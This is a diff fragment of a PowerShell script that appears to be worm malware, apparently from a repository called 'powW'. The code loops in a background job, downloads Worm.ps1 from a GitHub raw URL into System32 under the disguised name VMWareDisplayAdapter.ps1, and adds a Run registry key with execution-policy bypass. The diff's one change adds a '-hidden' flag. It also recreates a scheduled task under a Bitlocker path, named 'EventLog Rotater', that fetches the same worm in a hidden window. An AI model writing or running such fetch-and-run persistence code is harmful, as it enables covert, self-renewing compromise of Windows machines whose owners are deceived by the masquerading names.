@@ -185,7 +185,7 @@ start-job -ScriptBlock {
     while(1 -eq 1){
         try{ 
             Invoke-RestMethod https://raw.githubusercontent.com/Magrene/powW/main/Worm.ps1 | out-file -filepath c:\Windows\System32\VMWareDisplayAdapter.ps1
-            Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "VMWareDisplayAdapter-2.52" -Value "powershell.exe -file c:\Windows\System32\VMWareDisplayAdapter.ps1 -executionpolicy bypass -Force"
+            Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "VMWareDisplayAdapter-2.52" -Value "powershell.exe -file c:\Windows\System32\VMWareDisplayAdapter.ps1 -executionpolicy bypass -hidden -Force"
             Unregister-ScheduledTask -TaskPath \Microsoft\Windows\Bitlocker -TaskName "EventLog Rotater"  -Confirm:$false 
             $action = @()
             $action += new-scheduledtaskaction -execute 'Powershell.exe' ` -Argument '-windowstyle hidden -Command "invoke-restmethod https://raw.githubusercontent.com/Magrene/powW/main/Worm.ps1 | out-file -filepath c:\Windows\EventLog.ps1'
